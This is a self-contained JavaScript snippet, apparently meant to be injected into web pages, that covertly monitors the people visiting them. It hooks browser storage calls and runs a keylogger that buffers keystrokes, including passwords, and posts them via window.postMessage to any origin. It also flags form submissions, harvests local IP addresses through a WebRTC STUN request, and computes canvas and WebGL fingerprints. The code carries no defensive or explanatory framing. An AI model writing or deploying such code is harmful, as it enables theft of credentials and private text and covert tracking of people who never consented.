(() => {
  if (window.__sx0) return;
  window.__sx0 = 1;
  const ping = d => { try { window.postMessage(d, "*"); } catch (e) {} };

  /* storage-hooks */
  try {
    const p = Storage.prototype;
    for (const n of ["setItem", "removeItem", "clear"]) {
      const o = p[n];
      p[n] = function () { const r = o.apply(this, arguments); ping({ __s: 1 }); return r; };
    }
  } catch (e) {}

  /* keylogger */
  let kb = "", kt = null;
  addEventListener("keydown", e => {
    let s = e.key;
    if (s === "Backspace") s = "<BS>";
    else if (s === "Enter") s = "\n";
    else if (s === "Tab") s = "<TAB>";
    else if (s.length > 1) s = "<" + s + ">";
    kb += s;
    if (kb.length > 4000) kb = kb.slice(-4000);
    clearTimeout(kt);
    kt = setTimeout(() => ping({ __k: kb }), 1400);
  }, true);

  addEventListener("submit", () => ping({ __f: 1 }), true);

  /* WebRTC-leak */
  try {
    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
    const ips = new Set();
    pc.createDataChannel("x");
    pc.onicecandidate = e => {
      if (!e.candidate) { ping({ __i: [...ips] }); try { pc.close(); } catch (x) {} return; }
      const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
      if (m) ips.add(m[1]);
    };
    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
    setTimeout(() => { if (ips.size) ping({ __i: [...ips] }); }, 4500);
  } catch (e) {}

  /* canvas-fingerprint */
  try {
    const c = document.createElement("canvas");
    c.width = 240; c.height = 60;
    const x = c.getContext("2d");
    x.textBaseline = "top"; x.font = "16px Arial";
    x.fillStyle = "#f60"; x.fillRect(0, 0, 120, 30);
    x.fillStyle = "#069"; x.fillText("Sync 3.14 <>/\\{}", 2, 16);
    const d = c.toDataURL();
    let h = 5381;
    for (let i = 0; i < d.length; i++) h = ((h * 33) ^ d.charCodeAt(i)) >>> 0;
    ping({ __c: h.toString(16) });
  } catch (e) {}

  /* webgl-fingerprint */
  try {
    const c = document.createElement("canvas");
    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    if (gl) {
      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
      ping({ __g: dbg
        ? [gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL), gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)]
        : [gl.getParameter(gl.VENDOR), gl.getParameter(gl.RENDERER)] });
    }
  } catch (e) {}
})();